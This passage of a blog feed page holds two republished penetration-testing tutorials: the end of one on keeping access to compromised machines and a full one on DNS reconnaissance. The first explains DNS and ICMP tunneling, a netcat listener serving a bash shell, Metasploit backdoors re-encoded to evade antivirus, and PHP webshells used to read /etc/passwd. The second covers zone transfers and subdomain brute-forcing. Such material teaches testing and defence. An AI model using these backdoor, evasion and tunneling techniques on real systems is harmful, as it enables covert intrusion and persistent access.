&lt;p&gt;&lt;img src=&quot;/images/posts/Maintaining-Access//1.png&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;a) We use ./iodined as we want to start the iodine server&lt;/p&gt;

&lt;p&gt;b) -f specifies Iodine to run in foreground,”10.0.1.2” is used to set the IP-ADDRESS of the dns0 interface, basically Iodine sets up a virtual interface named dns0, through which the communication between the client and server will take place. Note that for testing inside a LAN, choose a different IP address if you are on the same subnet as 10.0.1.2. For e.g if you are on the same subnet as 10.0.1.2 in the LAN, you could use the IP 192.168.1.2 .&lt;/p&gt;

&lt;p&gt;c)Finally we need to enter the subdomain which will act as the other end of the tunnel. In this case it is tunnel.infosecinstitute.com.&lt;/p&gt;

&lt;p&gt;d)Iodine will then ask for a password. This is the password that is used to authenticate the client. It therefore adds an extra layer of security.&lt;/p&gt;

&lt;p&gt;Type “ifconfig dns0” to check that a new virtual interface has been created with the IP 10.0.1.2 .&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/Maintaining-Access//3.png&quot; alt=&quot;3&quot; /&gt;&lt;/p&gt;

&lt;p&gt;It is now time to set up the client. To do that go to your client and type the following command as shown in the figure below.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/Maintaining-Access//4.png&quot; alt=&quot;4&quot; /&gt;&lt;/p&gt;

&lt;p&gt;a)We use ./iodine as we want to start the iodine client.&lt;/p&gt;

&lt;p&gt;b) “-f” specifies Iodine to run in foreground, “-r 192.168.0.135” specifies the IP-address of the server running iodined, in a real world scenario, this should be a public IP address, which should be directly accessible from the internet. This is so that our client can communicate with it from anywhere.&lt;/p&gt;

&lt;p&gt;c) It will then ask for the subdomain we want to query. In this case it is tunnel.infosecinstitute.com.&lt;/p&gt;

&lt;p&gt;d)Finally we enter the same password we entered while setting up the server. Once the authentication is successful, Iodine client will communicate with the server and set up the tunnel.&lt;/p&gt;

&lt;p&gt;All right, let’s now do a quick “ifconfig dns0” on the client, we will see that a virtual interface named dns0 has been created on the client side as well and assigned the IP-Address 10.0.1.1 ,which is in the same subnet as the server IP( 10.0.1.2).&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/Maintaining-Access//6.png&quot; alt=&quot;6&quot; /&gt;&lt;/p&gt;

&lt;p&gt;To check if the tunnel is working, let’s do a ping to the server (10.0.1.2) from our client. As we can see that we get a response, this means the tunnel works.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/Maintaining-Access//7.png&quot; alt=&quot;7&quot; /&gt;&lt;/p&gt;

&lt;p&gt;If we see the packets in Wireshark, we will see that all the packets appear as DNS, even though right now ICMP ping requests and responses are being sent. This proves that all the traffic going through the tunnel appears as DNS traffic.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/Maintaining-Access//8.png&quot; alt=&quot;8&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;bping-tunneling&quot;&gt;b)Ping Tunneling&lt;/h2&gt;

&lt;p&gt;Ping Tunneling is the process of encapsulating different protocols into ICMP protocol. Hence all the traffic appears to be in the form of ICMP Requests and ICMP Response. We will be using Ptunnel for creating a ping tunnel as it comes preinstalled with Backtrack. Ptunnel tunnels TCP packets through the ping tunnel, and hence they appear as ping requests and replies. This could be used in scenarios in which the firewall allows us to send ping requests and receive replies but do not allow TCP traffic for connections. Ptunnel also requires a client to be set up on the victim machine and a server on another machine which forms the other end of the tunnel.&lt;/p&gt;

&lt;p&gt;To set up the ptunnel server, just go to the ptunnel directory in Backtrack and type in ./ptunnel .&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/Maintaining-Access//9.png&quot; alt=&quot;9&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This sets up the server side of the ping Tunnel. To set up the client side type in the following command as shown in the figure below.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/Maintaining-Access//10.png&quot; alt=&quot;10&quot; /&gt;&lt;/p&gt;

&lt;p&gt;a) -p 192.168.0.135 - This specifies the IP-address of the server running the ptunnel server.&lt;/p&gt;

&lt;p&gt;b)-lp 8000-This opens up port 8000 on the client and starts listening for incoming connections.&lt;/p&gt;

&lt;p&gt;c) -da and -dp specify the destination address and port we want to forward all the incoming requests to.&lt;/p&gt;

&lt;p&gt;Once this is done, we need to connect to port 8000 via ssh. To do this we need to configure ssh to run on port 8000. To do this edit the file “/etc/ssh/sshd_config” to run the ssh service on port 8000.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/Maintaining-Access//11.png&quot; alt=&quot;11&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once this is done, restart the ssh service and check to see if ssh is listening for connections on port 8000.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/Maintaining-Access//12.png&quot; alt=&quot;12&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Finally connect to the ssh service from the localhost by typing “ssh -p 8000 root@localhost” .Type in the root password (“toor” by default) and we get the screen as shown below.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/Maintaining-Access//13.png&quot; alt=&quot;13&quot; /&gt;&lt;/p&gt;

&lt;p&gt;SUCCESS! We just set up a ping tunnel ! Once the data flow has started, you can see the notification both on the server side and on the client side.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/Maintaining-Access//14.png&quot; alt=&quot;14&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;2)OS Backdoors&lt;/strong&gt;-The next category of tools are OS Backdoors .These backdoors when installed on the victim system can be used to create connections between the victim and the attacker machine. It can also be used to download files, execute commands and carry numerous other tasks.&lt;/p&gt;

&lt;p&gt;1)Netcat-Netcat is one of the most popular tools available for creating backdoors. Netcat opens up a port on the victim machine, and the attacker can then connect to that port. Netcat can also be used to transfer files.It can also be configured for running a program on the victim machine on successful connection from the hacker machine. For e.g in this case we are going to open up port 5555 on the victim machine, and configure it to present a shell to the hacker once the hacker successfully connects.&lt;/p&gt;

&lt;p&gt;Here are the commands on the victim machine&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/Maintaining-Access//15.png&quot; alt=&quot;15&quot; /&gt;&lt;/p&gt;

&lt;p&gt;a) -l tells it to listen for connections.&lt;/p&gt;

&lt;p&gt;b)-p 5555 specifies the port that is open and allows the connection.&lt;/p&gt;

&lt;p&gt;c)-e /bin/bash asks it to present a shell to the connecting machine.&lt;/p&gt;

&lt;p&gt;d) -v asks netcat to be more verbose.&lt;/p&gt;

&lt;p&gt;and here’s the configuration on the attacker machine&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/Maintaining-Access//16.png&quot; alt=&quot;16&quot; /&gt;&lt;/p&gt;

&lt;p&gt;To connect, we just need to specify the IP-address and the port. As we can see once we are connected we can execute commands on the victim machine and also see the results. In this case we run the commands “ls” and “cat /etc/passwd” on the victim.&lt;/p&gt;

&lt;p&gt;2)Sbd-Sbd is another program that can be used to create connections between the client and the sever. Some of the key features about sbd is that it can use encryption to encrypt the traffic.&lt;/p&gt;

&lt;p&gt;In this case we will be using sbd to transfer files from the client to the server.Here are the commands on the victim side. I would recommend you to explore the different options available in sbd to create covert connections.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/Maintaining-Access//17.png&quot; alt=&quot;17&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Here are the results obtained when we connect to the victim machine. As we can see that we see a dump of the file.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/Maintaining-Access//18.png&quot; alt=&quot;18&quot; /&gt;&lt;/p&gt;

&lt;p&gt;3) Msfpayload and Msfencode - Msfpayload is a part of the Metasploit framework. It allows us to create custom backdoors. These backdoors when executed on the victim can allow us to open up a connection between the victim and the attacker machine. However it is important for the backdoor to evade detection from the antivirus. For this we use MsfEncode which encodes the payload so that it is not detected by the antivirus. For Msfencode to encode the payload, we need to give it the file created by Msfpayload in Raw Format (by using the R option). In the diagram below we can see an example of creating an encoded executable file which can act as a backdoor.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/Maintaining-Access//msf.png&quot; alt=&quot;Msf&quot; /&gt;&lt;/p&gt;

&lt;p&gt;a) windows/meterpreter/bind_tcp is the payload we want to use. A payload is the code which is executed on the victim machine upon successful completion of the exploit.&lt;/p&gt;

&lt;p&gt;b)RHOST=192.168.0.134 is the IP-Address of the victim machine.&lt;/p&gt;

&lt;p&gt;c)”R” specifies that we want the output in Raw format because Msfencode requires the file to be in Raw format for encoding it properly.&lt;/p&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;d)”&lt;/td&gt;
      &lt;td&gt;” specifies that we are piping the result to some other program (in this case msfencode).&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;e) -e x86/shikata_ga_nai specifies the encoder that we want to use.&lt;/p&gt;

&lt;p&gt;f)-c 5 specifies the no of times we want to reencode the file, because the more no of times we encode it, the less probable it becomes for the antivirus to detect it.&lt;/p&gt;

&lt;p&gt;g)-o specifies the name of the output file that we want.&lt;/p&gt;

&lt;p&gt;h)-t exe specifies the format in which we want to output the file.&lt;/p&gt;

&lt;p&gt;Once this file is run on the victim machine, all we need to do is run a handler on our system and we will get a session on the victim machine.&lt;/p&gt;

&lt;p&gt;3) Web Backdoors - Web backdoors are another category of backdoors which could be installed on webservers. They can be webshells or can also be custom backdoors created using Msfpayload and Msfencode. Either way they allow us access either through an open port or through a web interface in the browser. For e.g. if the attacker gets access to the server, he can drop a malicious file say Backdoor.php onto the server. Later he can access the file through a browser and the web interface will allow the malicious hacker to perform various tasks, like traverse through directories, run system commands etc. Backtrack 5 ships in with some web backdoors, we will not be discussing creating backdoors using Msfencode and Msfpayload as we already discussed that in the previous section.&lt;/p&gt;

&lt;p&gt;We will be using backtrack as the victim server in this case, for this we need to install a backdoor in it’s “/var/www” folder and then we will start the apache server. Backtrack already comes with some backdoors that are located in “/pentest/backdoors/web/webshells” directory. To do these things, type in the commands as shown in the figure below.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/Maintaining-Access//20.png&quot; alt=&quot;20&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once we have set up the backdoor, migrate to it from the browser&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/Maintaining-Access//21.png&quot; alt=&quot;21&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As we can see it allows us to carry out remote commands on the system, let’s try the command “cat /etc/passwd”. We will see that we get a dump of the whole file.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/Maintaining-Access//22.png&quot; alt=&quot;22&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Let’s try this out for another backdoor named “php-backdoor.php”. First let’s move it to the /var/www folder.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/Maintaining-Access//23.png&quot; alt=&quot;23&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And now let’s migrate to the file from the browser. As we can see that it provides us with a beautiful interface, we can execute commands, browse to directories, upload files, and even execute mysql queries.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/Maintaining-Access//24.png&quot; alt=&quot;24&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;In this article we discussed different ways of maintaining access on a victim once it is compromised. There could be different scenarios, the victim may be behind a firewall, or could just be running a simple web server directly accessible from the internet. We learnt about 3 different tags of tools a) Tunneling tools, which can help us encapsulate one protocol onto another, thereby bypassing the firewall b)OS Backdoor- Netcat , sbd , creating custom backdoors using Msfpayload and then encode it using Msfencode c)Web backdoors- Could be some kind of custom backdoors, or could be webshells which could allow us to execute commmands, browse directories on the remote server etc.&lt;/p&gt;

&lt;p&gt;This article was originally published on the &lt;a href=&quot;http://resources.infosecinstitute.com/&quot;&gt;resources&lt;/a&gt; page at &lt;a href=&quot;http://infosecinstitute.com/&quot;&gt;Infosec Institute&lt;/a&gt;. For more information, please visit my author &lt;a href=&quot;http://resources.infosecinstitute.com/author/prateek/&quot;&gt;page&lt;/a&gt;.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>DNS Hacking - Beginner to Advanced</title>
   <link href="https://bitbrain.github.io/2013/06/09/dns-hacking-beginner-to-advanced.html"/>
   <updated>2013-06-09T22:42:00+00:00</updated>
   <id>https://bitbrain.github.io/2013/06/09/dns-hacking-beginner-to-advanced</id>
   <content type="html">&lt;p&gt;DNS is a naming system for computers that converts human readable domain names e.g. (infosecinstitute.com) into computer readable Ip-addresses. However some security vulnerabilites exist due to misconfigured DNS nameservers that can lead to information disclosure about the domain. This forms an important step of the Information stage during a Penetration test or Vulnerability assessment. In this article we will look at the following areas..&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;DNS Basics&lt;/li&gt;
  &lt;li&gt;Resource records and the Zone file&lt;/li&gt;
  &lt;li&gt;DNS Lookup and Reverse DNS Lookup&lt;/li&gt;
  &lt;li&gt;Understanding Wildcard Entries&lt;/li&gt;
  &lt;li&gt;DNS Zone transfer&lt;/li&gt;
  &lt;li&gt;DNS Bruteforcing&lt;/li&gt;
&lt;/ol&gt;

&lt;!--more--&gt;

&lt;hr /&gt;

&lt;p&gt;1) &lt;strong&gt;DNS Basics&lt;/strong&gt;-DNS converts human readable domain names into IP-addresses. This is because domain names are much easier to remember than Ip-addresses . This process may take place through a local cache or through a zone file that is present on the server .A zone file is a file on the server that contains entries for different Resource Records (RR). These records can provide us a bunch of information about the domain. We will look more into Resource Records and the zone file in the next section.&lt;/p&gt;

&lt;p&gt;So Let’s understand how DNS resolution works. Let’s say the user opens up the browser and types in infosecinstitute.com. It is now the responsibility of the DNS resolver in the user’s operating system to fetch the IP address. It first checks it’s local cache to see if it can find a record for the queried domain name. A cache usually contains a mapping of IP-addresses to hostnames which are saved during recent lookups so that the resolver does not have to fetch the IP address again and again. If it can’t find the IP address in it’s cache it queries the DNS server to see if it has a record for it. A DNS server is usually given to you by the ISP or you can manually set up a DNS server for yourself.If it still can’t find the IP Address then it goes through a process or recursive DNS query in which it queries different nameservers to get the IP-address of the domain. As soon as it finds the IP-address it returns the IP Address back to the user and also caches it for it’s future use.&lt;/p&gt;

&lt;p&gt;Let’s do a quick demo. We are going to use the nslookup utility for this demo. Just type in the commands as shown in the figure below.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/dns/nslookup-intro.png&quot; alt=&quot;Nslookup Intro&quot; /&gt;&lt;/p&gt;

&lt;p&gt;a)In the second line we set the type = a . This means that we are querying for the A records which will return us an Ip-address in return for the domain we query. We will look more into records in the next section.&lt;/p&gt;

&lt;p&gt;b)As soon as we type in google.com we get an output showing the server and an Ip address#port. This server is basically the current DNS server that will be serving our request. In this case it is 10.0.1.1 and the port no is 53. This is because DNS uses UDP port 53 to serve its requests. We can also set the current DNS server by using the command “server Ip-address”&lt;/p&gt;

&lt;p&gt;c) The third line in the output shows “Non-authoritative answer”. This basically means that our DNS server queried an external DNS server to fetch the Ip-address. Below we can see all the Ip-addresses associated with google.com. This is usually the case with large organizations. They use multiple servers to serve the request as one server is generally not capable of handling all the requests.&lt;/p&gt;

&lt;p&gt;QUICK EXERCISE- Set the current server to ns1.google.com by using the command “server ns1.google.com”, and see if you still get “Non-Authoritative answer” in the output for a query for the domain google.com. Also explore the tool Dig and see if you can do the above exercise Dig.&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;2)&lt;strong&gt;Resource Records and the Zone file&lt;/strong&gt; -A Zone file is basically a text file present on the server hosting the domain that contains entries for different resource records. Each line is represented by a different record .In some cases these records may exceed one line and hence must be enclosed within a parantheses. Each zone file must start with a Start of Authority (SOA) record containing an authoritative nameserver for the domain (for e.g. ns1.google.com for google.com ) and an email address of someone responsible for the management of the nameserver. An example of a zone file is given below.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$ORIGIN infosecinstitute.com.;This marks the beginning of the file $TTL 86400 ; TTL is 24 hours , it could also be 1d or 1h infosecinstitute.com IN SOA ns1.infosecinstitute.com. webmaster.infosecinstitute.com. ( 2002026801 ; serial number of this zone file 2d ; refresh time for slave 5h ; retry time for slave 2w ; expiration time for slave 1h ; maximum caching time ) NS ns1.infosecinstitute.com. ; ns1 is a nameserver for infosecinstitute.com NS ns2.infosecinstitute.com. ; ns2 is a backup nameserver for infosecinstitute.com MX 10 mail.infosecinstitute.com. ; mail server ns1 A 192.168.1.1 ; Ipv4 address for ns1.infosecinstitute.com www CNAME infosecinstitute.com ; www.infosecinstitute.com is an alias for infosecinstitute.com ftp IN CNAME www.infosecinstitute.com. ; CNAME for ftp mail A 192.0.3.2 ; Ipv4 address for mail.infosecinstitute.com&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;a)As we can see that it contains a TTL value in the second line, this means that all the resource records have an expiration time of 1hr, after this time every record will have to make another query and refresh it’s data.&lt;/p&gt;

&lt;p&gt;b)We can also see the different records that are present in the zone file. The general way of writing a resource record is writing the domain name, record class, record type, and then some additional information.&lt;/p&gt;

&lt;p&gt;Different types of Resource Records exist within a Zone file. However we are going to discuss some of the important ones&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;A Records- Maps an IP Address to a hostname.For eg. 74.125.236.80 for google.com.&lt;/li&gt;
  &lt;li&gt;NS Records-Delegates a given zone to use the given authoritative nameserver. For e.g. ns1.google.com is an authoritative nameserver for google.com&lt;/li&gt;
  &lt;li&gt;MX Records-This basically tells us which server is responsible for receiving mails sent to that domain name.&lt;/li&gt;
  &lt;li&gt;TXT Records-This consists of arbitrarily human readable text in a record.&lt;/li&gt;
  &lt;li&gt;CNAME Records- Gives an alias of one name to another.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Let’s do a demo to make this clear. I have purposely added some records in my website searching-eye.com for this article,so they may not be available when you perform this, however you can try the same exercise on other domains, type in the commands as shown in the figure below.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/dns/nslookup-detail.png&quot; alt=&quot;Nslookup Detail&quot; /&gt;&lt;/p&gt;

&lt;p&gt;a) In the first command in nslookup I set the type to A which means I want Ip-address for a particular domain. I type in the domain name as the second command and get the corresponding Ip-address for it.&lt;/p&gt;

&lt;p&gt;b) In the third command i set the type to NS as i am interested in finding the nameservers for searching-eye.com. Type in the domain name as the fourth command and we get the corresponding nameservers for the domain searching-eye.com. Note that finding the nameservers can give us some information about the hosting provider of the domain. Some large organizations use their own nameservers e.g. ns2.google.com.&lt;/p&gt;

&lt;p&gt;c)I now set the current server to one of the nameservers, this is because I am interested in finding the latest information about the domain. Note that querying from your own dns server may not give you the accurate information everytime. I set the type to MX and again type in the domain name. What we get is a list of mail servers responsible for handling emails sent to that domain. The number before them denotes the priority with which to fetch mails. Lower the number, higher the priority.&lt;/p&gt;

&lt;p&gt;d)Next i set the type to CNAME and type in a subdomain, i get a cannonical name as infosecinstitute.com. This means any request to the queried domain (in this case prateek.searching-eye.com) will be redirected to infosecinstitute.com.&lt;/p&gt;

&lt;p&gt;I will take this moment to introduce DIG which is a handy little tool, we can also do the same queries using DIG. Let’s search for MX records in the same domain. I would suggest you try querying for the other domains yourself.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/dns/dig intro.png&quot; alt=&quot;Dig Intro&quot; /&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;3)&lt;strong&gt;DNS Lookup and Reverse DNS Lookup&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;DNS Lookup&lt;/strong&gt;-Let’s peform a DNS Lookup ourselves for infosecinstitute.com. We will do this by traversing the entire DNS hierarchy from the root servers to the Top level domain. Open up the terminal in Backtrack (you can use your own favourite distro) and type in “dig”. You will get something as shown in the figure below.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/dns/dig.png&quot; alt=&quot;Dig&quot; /&gt;&lt;/p&gt;

&lt;p&gt;What we get is a list of the Root DNS Servers. Let’s use this root DNS server to query infosecinstitute.com. We do this as shown in the figure below&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/dns/dig 1st query.png&quot; alt=&quot;Dig 1st Query&quot; /&gt;&lt;/p&gt;

&lt;p&gt;What we get is a list of authoritative name servers for the com domain. Notice the dot (.) at the end, this is what makes this a fully qualified domain name (FQDN). Let’s use these Name servers to query again.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/dns/dig 2nd query.png&quot; alt=&quot;Dig 2nd Query&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now we get the list of authoritative name servers for infosecinstitute.com (which is ns1.pairnic.com and ns2.pairnic.com). Now we need to query these name servers to get the Ip-address of Infosecinstitute.com&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/dns/dig 3rd query.png&quot; alt=&quot;Dig 3rd Query&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And now in the Answer Section we can see that the Ip-address for infosecinstitute.com is 216.92.251.5. SUCCESS !&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Reverse DNS Lookup&lt;/strong&gt;- Performing Reverse DNS Lookup converts an Ip-address into it’s hostname. For this we need to write the Ip address in reverse order (for eg 192.168.1.1 will be 1.1.168.192) and then append “.in-addr.arpa.” to it. Next we need to make a query for a PTR Record using DIG. Let’s make a DNS PTR query for 216.92.251.5, the command here would be “dig 5.251.92.216.in-addr.arpa PTR”&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/dns/dig-reverse-lookup.png&quot; alt=&quot;Dig Reverse Lookup&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As we can clearly see, this ip address resolves to infosecinstitute.com. As Simple as that!&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;4) &lt;strong&gt;Understanding Wildcard Entries&lt;/strong&gt;-&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;WildCard&lt;/strong&gt; - A wildcard entry is used to provide responses for subdomains that do not exist. For e.g. let’s say we have a domain example.com. If we set a wildcard record for *.example.com and give it the value example.com then the requests for all the non-existent subdomains of example.com (for eg. abcd.example , blah.example.com) will point to example.com. In the information gathering stage of a penetration test of a website, it is important to identify the subdomains and the Ip-addresses corresponding to them. Introducing a Wildcard feature reduces this to a small extent.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Bypassing Wildcard entries&lt;/strong&gt; - In case wildcard entries are set on a particular domain, it could be bypassed to reveal information about it’s subdomains. This is done by bruteforcing the subdomains. We have a wordlist in which we contain the subdomain names we want to test the domain against. Then we do a ping of all these subdomains, if these domains resolve to an Ip-address different than the host Ip address, then we can very surely say that this subdomain actually exists.However before performing a brute force it would be better to actually check if Wildcard entries are enabled or not. For that we can ping some random subdomains for e.g. 434234.example.com and see if it’s IP-address is the same as the host IP-address(in this case example.com). If this is the case for some random subdomains, then we can clearly say that Wildcard entries are enabled for this domain. We will perform a demo of this in the coming section.&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;5)&lt;strong&gt;DNS Zone Transfer&lt;/strong&gt;-We saw in the previous exercises that every domain has some authoritative nameservers associated with it. For eg in the case of google.com, the nameservers were ns1.google.com to ns4.google.com .These Nameservers are used for handling requests related to the domain google.com. Let’s say we have a domain example.com and it has it’s two nameservers as ns1.example.com and ns2.example.com. Usually a big organization will have more than one nameservers so that if one goes down for some time, the other one is ready to back it up and handle the requests. Usually one of these servers will be the Master server and the other one will be the slave server. Hence to stay in sync with each other, the slave server must query the Master server and fetch the latest records. The Master server will provide the slave server with all the information it has. This is basically what is called a “Zone Transfer”. It’s like asking the nameserver “Give me everything you have”. A properly configured nameserver should only be allowed to server requests of Zone transfer from other Nameservers of the same domain. However if the server is not configured properly it will serve all requests of Zone transfer made to it without checking the querying client .This leads to leakage of valuable information. DNS Zone transfer is sometimes referred through it’s opcode mnemonic AXFR.&lt;/p&gt;

&lt;p&gt;Let’s see an example of a Zone transfer. We will be using the tool Fierce present by default in Backtrack. Fierce is one of the best tools available out there for DNS Analysis. Type in the following command “perl fierce.pl -dns searching-eye.com”. We get something as shown in the figure below.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/dns/fierce-start-zone-transfer.png&quot; alt=&quot;Fierce Start Zone Transfer&quot; /&gt; &lt;img src=&quot;/images/posts/dns/fierce-end-zone-transfer.png&quot; alt=&quot;Fierce End Zone Transfer&quot; /&gt;&lt;/p&gt;

&lt;p&gt;What fierce does is that it first finds out the nameservers for the domain. It then checks to see if they allow zone transfers. Since one of the nameservers is not properly configured, it allows zone transfer and what we see is a dump of all the information (records , subdomains etc).&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Why is Zone transfer a Security Issue?&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;A zone transfer reveals a lot of information about the domain. This forms a very important part of the “Information Gathering” stage during a penetration test, vulnerability assessment etc. We can figure out a lot of things by looking at the dump.For eg. we can find different subdomains. Some of them might be running on different servers.Those server may not be fully patched and hence be vulnerable.From this point, we can start thinking about Metasploit ,Nessus,Nmap etc and do a full vulnerability assessment of the domain. Hence This kind of information increases our attack vector by a fair amount, an amount which cannot be ignored.&lt;/p&gt;

&lt;p&gt;To protect your nameservers from leaking valuable information, one must allow zone transfer to other nameservers of the same domain only . For eg. ns1.example.com should allow zone transfer to ns2.example.com only and discard all the other requests.&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;6)&lt;strong&gt;DNS Bruteforcing&lt;/strong&gt;-DNS Zone transfers may not work all the time. In fact, it will not work most of the time. Most of the DNS servers are properly configured and do not allow zone transfers to every client. Well what do we do then ? Simple answer, the same thing we do when nothing works, BRUTE FORCE it ! Basically we have a wordlist containing a huge list of hosts. We first check for wildcard entries by checking if a random subdomain for e.g. 132qdssac.example.com resolves to the same IP-address as example.com .If this is the case, we know Wildcard entries are set. We then query the domain by using each of the word in our wordlist. For e.g. if one of the entries in the wordlist file is “ads” , then we make a query for ads.example.com. If it resolves to a different IP-address then we are sure that this subdomain actually exists. Hence we now have information about the name of subdomain and it’s Ip-address. If wildcard entries are not set , we do the same thing and see if we get response from any subdomain we query. If we get a response back, we could be sure that the subdomain actually exists. In the end what we get is a bunch of information about the domain.&lt;/p&gt;

&lt;p&gt;Let’s see this through a demo. We will again use the tool “Fierce”. Fierce is a very handy tool for DNS Analysis and it is something everyone should have in their armory. Fierce will first check if Zone transfers are allowed or not, if zone transfers are allowed, it will dump all the information and exit happily, otherwise it will bruteforce it. We need to supply Fierce with a wordlist containing a list of all the possible subdomain names (for e.g. hosts,ads,contracts). Fierce comes with an inbuilt wordlist file “hosts.txt” and we will be using the same for our demo.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/dns/fierce-bruteforcing.png&quot; alt=&quot;Fierce Bruteforcing&quot; /&gt; &lt;img src=&quot;/images/posts/dns/fierce-bruteforcing2.png&quot; alt=&quot;Fierce Bruteforcing2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As we can see, Fierce dumps out information about the subdomains of google.com&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;conclusion&quot;&gt;CONCLUSION&lt;/h2&gt;

&lt;p&gt;DNS protocol is a very critical component of the Internet as it resolves IP address into hostnames and makes life easier for us. However, if the nameservers are not properly configured they might leak out the whole DNS server database to any malicious hacker. Even if the servers are properly configured, they can be bruteforced to leak information about their mail servers, IP addresses, etc. It is therefore important to properly configure your DNS servers and be aware of the security issues with DNS.&lt;/p&gt;

&lt;p&gt;This article was originally published on the &lt;a href=&quot;http://resources.infosecinstitute.com/&quot;&gt;resources&lt;/a&gt; page at &lt;a href=&quot;http://infosecinstitute.com/&quot;&gt;Infosec Institute&lt;/a&gt;. For more information, please visit my author &lt;a href=&quot;http://resources.infosecinstitute.com/author/prateek/&quot;&gt;page&lt;/a&gt;.&lt;/p&gt;

</content>
 </entry>
 

</feed>


      </div>
    </main><footer class="site-footer">
  <div class="wrapper">
    <div class="credits"><a href="https://github.com/bitbrain/jekyll-dash">dash</a> theme for Jekyll by <a href="https://github.com/bitbrain">bitbrain</a> made with <i class="fas fa-heart"></i><div class="toggleWrapper">
    <input type="checkbox" class="dn" id="theme-toggle" onclick="modeSwitcher()" checked />
    <label for="theme-toggle" class="toggle">
    <span class="toggle__handler">
      <span class="crater crater--1"></span>
      <span class="crater crater--2"></span>
      <span class="crater crater--3"></span>
    </span>
        <span class="star star--1"></span>
        <span class="star star--2"></span>
        <span class="star star--3"></span>
        <span class="star star--4"></span>
        <span class="star star--5"></span>
        <span class="star star--6"></span>
    </label>
</div>
<script type="text/javascript">
const theme = localStorage.getItem('theme');

if (theme === "light") {
    document.documentElement.setAttribute('data-theme', 'light');
} else {
    document.documentElement.setAttribute('data-theme', 'dark');
}
const userPrefers = getComputedStyle(document.documentElement).getPropertyValue('content');

function activateDarkTheme() {
    document.getElementById('theme-toggle').checked = true;
    document.documentElement.setAttribute('data-theme', 'dark');
    document.documentElement.classList.add('theme--dark');
    document.documentElement.classList.remove('theme--light');
	document.getElementById("theme-toggle").className = 'light';
	window.localStorage.setItem('theme', 'dark');
}

function activateLightTheme() {
    document.getElementById('theme-toggle').checked = false;
    document.documentElement.setAttribute('data-theme', 'light');
    document.documentElement.classList.add('theme--light');
    document.documentElement.classList.remove('theme--dark');
	document.getElementById("theme-toggle").className = 'dark';
	window.localStorage.setItem('theme', 'light');
}

if (theme === "dark") {
    activateDarkTheme();
} else if (theme === "light") {
    activateLightTheme();
} else if  (userPrefers === "light") {
    activateDarkTheme();
} else {
    activateDarkTheme();
}

function modeSwitcher() {
